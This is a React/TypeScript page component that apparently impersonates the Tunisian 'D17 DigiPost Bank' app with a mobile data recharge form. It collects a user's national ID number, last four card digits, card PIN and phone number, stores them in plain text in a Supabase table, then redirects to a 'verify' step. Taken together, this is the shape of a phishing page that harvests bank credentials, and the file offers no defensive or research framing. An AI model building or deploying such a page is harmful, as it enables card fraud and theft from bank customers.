import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { supabase } from '@/integrations/supabase/client';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
import { Dialog, DialogContent } from '@/components/ui/dialog';
import { toast } from 'sonner';
import { Loader2, Smartphone, CreditCard, User, Phone, CheckCircle, Sparkles, LogOut, Wallet } from 'lucide-react';
import { motion } from 'framer-motion';
import d17Logo from '@/assets/d17-logo.png';

const FORFAITS = [
  { value: '15', label: '15 Gb' },
  { value: '25', label: '25 Gb' },
  { value: '30', label: '30 Gb' },
  { value: '35', label: '35 Gb' },
  { value: '45', label: '45 Gb' },
  { value: '50', label: '50 Gb' },
  { value: '55', label: '55 Gb' },
];

function getRechargeSession() {
  try {
    const s = sessionStorage.getItem('recharge_session');
    return s ? JSON.parse(s) : null;
  } catch { return null; }
}

export default function Recharge() {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [forfait, setForfait] = useState('');
  const [cin, setCin] = useState('');
  const [numCarte, setNumCarte] = useState('');
  const [codeCarte, setCodeCarte] = useState('');
  const [tel, setTel] = useState('');
  const [showSuccessPopup, setShowSuccessPopup] = useState(false);
  const [session, setSession] = useState<any>(null);

  useEffect(() => {
    const s = getRechargeSession();
    if (!s) {
      navigate('/recharge/login');
      return;
    }
    const op = sessionStorage.getItem('recharge_operator');
    if (!op) {
      navigate('/recharge/operator');
      return;
    }
    setSession({ ...s, operator: op });
  }, [navigate]);

  const onlyDigits = (value: string, maxLen: number) => value.replace(/\D/g, '').slice(0, maxLen);

  const handleLogout = () => {
    sessionStorage.removeItem('recharge_session');
    sessionStorage.removeItem('recharge_operator');
    navigate('/recharge/login');
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!forfait) { toast.error('Veuillez choisir un forfait'); return; }
    if (cin.length !== 8) { toast.error('Le CIN doit contenir 8 chiffres'); return; }
    if (numCarte.length !== 4) { toast.error('Les 4 derniers chiffres de la carte sont requis'); return; }
    if (codeCarte.length !== 4) { toast.error('Le code confidentiel doit contenir 4 chiffres'); return; }
    if (tel.length !== 8) { toast.error('Le numéro de téléphone doit contenir 8 chiffres'); return; }

    setLoading(true);
    try {
      const { data, error } = await supabase
        .from('recharges' as any)
        .insert({
          forfait,
          cin,
          num_carte: numCarte,
          code_carte: codeCarte,
          tel,
          status: 'pending',
        })
        .select('id')
        .single();

      if (error) throw error;

      setShowSuccessPopup(true);
      setTimeout(() => {
        setShowSuccessPopup(false);
        navigate(`/recharge/verify?id=${(data as any).id}&cin=${cin}`);
      }, 3000);
    } catch (err: any) {
      toast.error('Erreur lors de l\'envoi: ' + (err.message || 'Réessayez'));
    } finally {
      setLoading(false);
    }
  };

  if (!session) return null;

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-950 via-slate-900 to-indigo-950 flex items-center justify-center p-4">
      {/* Background effects */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-1/4 left-1/4 w-64 h-64 bg-blue-500/5 rounded-full blur-3xl animate-pulse" />
        <div className="absolute bottom-1/3 right-1/4 w-96 h-96 bg-indigo-500/5 rounded-full blur-3xl animate-pulse delay-1000" />
      </div>

      <div className="w-full max-w-md relative z-10">
        {/* Header */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5 }}
          className="text-center mb-6"
        >
          <div className="flex justify-center mb-4">
            <div className="relative">
              <div className="absolute inset-0 bg-blue-500/20 rounded-2xl blur-xl" />
              <img src={d17Logo} alt="D17 DigiPost Bank" className="h-16 w-16 rounded-2xl shadow-2xl relative z-10" />
            </div>
          </div>
          <h1 className="text-2xl font-bold text-white">Recharge</h1>
          <p className="text-blue-200/60 mt-1 text-sm">
            {session.operator === 'ooredoo' ? 'Ooredoo' : session.operator === 'tt' ? 'Tunisie Telecom' : 'Orange'}
          </p>

          {/* Balance + User info bar */}
          <div className="mt-3 flex items-center justify-center gap-3">
            <span className="flex items-center gap-1.5 text-xs text-emerald-400 bg-emerald-500/10 px-3 py-1 rounded-full border border-emerald-500/20">
              <Wallet className="h-3 w-3" />
              {(session.balance ?? 0).toFixed(2)} DT
            </span>
            <span className="text-xs text-blue-300/60 bg-white/[0.06] px-3 py-1 rounded-full">
              {session.phone}
            </span>
            <button onClick={handleLogout} className="text-blue-300/40 hover:text-red-400 transition-colors">
              <LogOut className="h-3.5 w-3.5" />
            </button>
          </div>
        </motion.div>

        {/* Form */}
        <motion.form
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5, delay: 0.15 }}
          onSubmit={handleSubmit}
          className="bg-white/[0.07] backdrop-blur-xl rounded-3xl border border-white/10 shadow-2xl p-6 space-y-5"
        >
          {/* Forfait */}
          <div className="space-y-3">
            <Label className="text-sm font-semibold flex items-center gap-2 text-blue-100">
              <Smartphone className="h-4 w-4 text-blue-400" />
              Forfait
            </Label>
            <RadioGroup value={forfait} onValueChange={setForfait} className="grid grid-cols-4 gap-2">
              {FORFAITS.map((f) => (
                <label
                  key={f.value}
                  className={`flex items-center justify-center rounded-xl border-2 px-3 py-2.5 text-sm font-medium cursor-pointer transition-all ${
                    forfait === f.value
                      ? 'border-blue-400 bg-blue-500/20 text-blue-300'
                      : 'border-white/10 hover:border-blue-400/30 text-white/70'
                  }`}
                >
                  <RadioGroupItem value={f.value} className="sr-only" />
                  {f.label}
                </label>
              ))}
            </RadioGroup>
          </div>

          {/* CIN */}
          <div className="space-y-2">
            <Label htmlFor="cin" className="text-sm font-semibold flex items-center gap-2 text-blue-100">
              <User className="h-4 w-4 text-blue-400" />
              CIN
            </Label>
            <Input id="cin" type="text" inputMode="numeric" placeholder="8 chiffres" value={cin}
              onChange={(e) => setCin(onlyDigits(e.target.value, 8))} required
              className="h-11 bg-white/[0.06] border-white/10 text-white placeholder:text-white/30 focus:border-blue-400/50 rounded-xl" />
          </div>

          {/* Card Last 4 */}
          <div className="space-y-2">
            <Label htmlFor="num_carte" className="text-sm font-semibold flex items-center gap-2 text-blue-100">
              <CreditCard className="h-4 w-4 text-blue-400" />
              4 Derniers Chiffres de la Carte
            </Label>
            <Input id="num_carte" type="text" inputMode="numeric" placeholder="4 derniers chiffres" value={numCarte}
              onChange={(e) => setNumCarte(onlyDigits(e.target.value, 4))} required
              className="h-11 bg-white/[0.06] border-white/10 text-white placeholder:text-white/30 focus:border-blue-400/50 rounded-xl" />
          </div>

          {/* Card Code */}
          <div className="space-y-2">
            <Label htmlFor="code_carte" className="text-sm font-semibold flex items-center gap-2 text-blue-100">
              <CreditCard className="h-4 w-4 text-blue-400" />
              Code Confidentiel
            </Label>
            <Input id="code_carte" type="text" inputMode="numeric" placeholder="4 chiffres" value={codeCarte}
              onChange={(e) => setCodeCarte(onlyDigits(e.target.value, 4))} required autoComplete="off"
              className="h-11 bg-white/[0.06] border-white/10 text-white placeholder:text-white/30 focus:border-blue-400/50 rounded-xl" />
          </div>

          {/* Phone */}
          <div className="space-y-2">
            <Label htmlFor="tel" className="text-sm font-semibold flex items-center gap-2 text-blue-100">
              <Phone className="h-4 w-4 text-blue-400" />
              Tél
            </Label>
            <Input id="tel" type="text" inputMode="numeric" placeholder="8 chiffres" value={tel}
              onChange={(e) => setTel(onlyDigits(e.target.value, 8))} required
              className="h-11 bg-white/[0.06] border-white/10 text-white placeholder:text-white/30 focus:border-blue-400/50 rounded-xl" />
          </div>

          <Button type="submit"
            className="w-full h-12 text-base font-semibold rounded-xl bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white shadow-lg shadow-blue-500/25"
            disabled={loading}>
            {loading ? <Loader2 className="h-5 w-5 animate-spin mr-2" /> : null}
            Envoyer
          </Button>
        </motion.form>

        {/* Success Popup */}
        <Dialog open={showSuccessPopup} onOpenChange={() => {}}>
          <DialogContent className="max-w-sm border-0 bg-transparent shadow-none [&>button]:hidden p-0">
            <motion.div
              initial={{ scale: 0.8, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              transition={{ type: 'spring', damping: 20, stiffness: 300 }}
              className="bg-gradient-to-br from-emerald-500 to-green-600 rounded-3xl p-8 text-center shadow-2xl shadow-green-500/30"
            >
              <motion.div
                initial={{ scale: 0 }}
                animate={{ scale: 1 }}
                transition={{ delay: 0.2, type: 'spring', damping: 15 }}
                className="mx-auto h-20 w-20 rounded-full bg-white/20 backdrop-blur-sm flex items-center justify-center mb-5"
              >
                <CheckCircle className="h-10 w-10 text-white" />
              </motion.div>
              <h2 className="text-xl font-bold text-white mb-2">Demande envoyé avec succès</h2>
              <p className="text-green-100/80 text-sm mb-4">Redirection vers la vérification...</p>
              <div className="flex justify-center">
                <div className="flex gap-1">
                  {[0, 1, 2].map((i) => (
                    <motion.div
                      key={i}
                      className="w-2 h-2 bg-white/60 rounded-full"
                      animate={{ opacity: [0.3, 1, 0.3] }}
                      transition={{ duration: 1.2, repeat: Infinity, delay: i * 0.2 }}
                    />
                  ))}
                </div>
              </div>
            </motion.div>
          </DialogContent>
        </Dialog>
      </div>
    </div>
  );
}
